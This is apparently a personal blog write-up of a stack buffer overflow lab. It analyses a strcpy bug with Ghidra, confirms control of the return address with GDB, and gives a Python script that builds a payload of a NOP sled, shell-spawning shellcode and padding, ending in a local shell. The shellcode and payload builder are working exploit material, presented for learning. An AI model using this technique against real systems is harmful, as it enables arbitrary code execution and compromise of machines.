---
title: "Exploiting a Stack Buffer Overflow"
description: "Step-by-step technical writeup of a stack buffer overflow lab, including vulnerability analysis with Ghidra, debugging with GDB, shellcode crafting, and successful exploitation."
image: /images/BufferOverFlow/buffover.png
date: 2025-09-12 20:00:00 +00:00
categories: [pwn]
tags: [reverse, pwn, ghidra, gdb, exploit, buffer-overflow]
---


# Exploiting a stack buffer overflow

## Part 1: Analyze the target

### Execution

![alt text](/images/BufferOverFlow/execution_bof.png)

### Ghidra analyse
the problem come from the `vuln` function , and exactly using `strcpy` function witout boundaries checking , in fact this fonction copy all our input into the stack starting from the  `local_108` pointer so if our input size is big enough (the second case of the execution part) this operation of copy may override the return adress and modify the essential adresses like RET and that what hapen in our `segmentation fault` , it is because `buffer overflow` vulnerability and the leak of stack protector.

![alt text](/images/BufferOverFlow/bof_ghidra.png)

this test with `gdb` show that `the buffer overflow` is happen because  of `strcpy` function and modifying the adress of return `RET` and that lead  to  `segmentation fault`.

![alt text](/images/BufferOverFlow/gdb_bof.png)

using this wit `$L = 256$`:
```sh
$gdb bof
$run "$(python3 -c 'print("A"*(L+8) + "B"*6)')"
$info reg
```

our output shows that we've successfully overwritten the rip (instruction pointer) with the value 0x424242424242, which is the hexadecimal representation of the "BBBBBB" pattern. This confirms the following:

   - Calculated Padding is Correct: The length of (256 + 8) "A" characters followed by 6 "B" characters correctly reaches and overwrites the return address.

   - Precise Control Achieved: Since rip now holds 0x424242424242, we have precise control over the return address. This means we can replace the "BBBBBB" pattern with any address we'd like the program to jump to.

![alt text](/images/BufferOverFlow/reg_gdb_bof.png)

## Part 2: set up a shell code

### Cenerating the payload

we encanter some issus to make this party using `python -c` command so we start by generation the payload using 

```python
import struct

L = 256
# Shellcode (27 bytes)
shellcode = b"\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"

# NOP sled (16 bytes)
nop_sled = b"\x90" * 16

# Offset to RIP (adjust this based on your findings)
offset = L + 8

# Padding
padding_size = offset - len(nop_sled) - len(shellcode)
padding = b"A" * padding_size

# Placeholder for return address (we'll replace this later)
return_address = b"BBBBBB"

payload = nop_sled + shellcode + padding + return_address

with open("payload", "wb") as f:
    f.write(payload)

print(f"Payload written to 'payload' file. Total length: {len(payload)} bytes")
f.close()

```

after we have generate the payload , we replay the last process with this payload , we had succefully store this shell code at the beginning of the input buffer and also make the `rip` value `0x424242424242` (BBBBBB) but we need a valid adress to avoid crash

![alt text](/images/BufferOverFlow/shell_gdb.png)

### Os injection
Using `gdb`, we retrieve the address of our code: `buffer_address = b"0x7fffffffdb28"`. We then generate our payload using the previously provided Python script and execute our attack. As a result, we successfully gain a shell.


![alt text](/images/BufferOverFlow/bash_inj.png)













